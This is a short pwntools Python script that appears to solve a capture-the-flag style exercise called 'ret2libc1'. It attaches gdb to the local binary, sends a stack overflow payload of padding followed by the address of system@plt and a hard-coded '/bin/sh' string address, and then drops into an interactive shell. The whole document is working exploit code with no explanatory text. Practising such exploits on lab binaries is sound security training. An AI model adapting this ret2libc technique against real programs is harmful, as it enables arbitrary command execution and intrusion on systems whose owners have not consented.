from pwn import *

p = process("./ret2libc1")
gdb.attach(p,"b *0x08048595")
elf = ELF("./ret2libc1")

system = elf.plt["system"]
binsh = 0x0804A028
p.recvuntil("ret2libc1\n")
payload = "a" * 0x108 + "junk"
payload += p32(system) + "junk" + p32(binsh)
p.sendline(payload)
p.interactive()
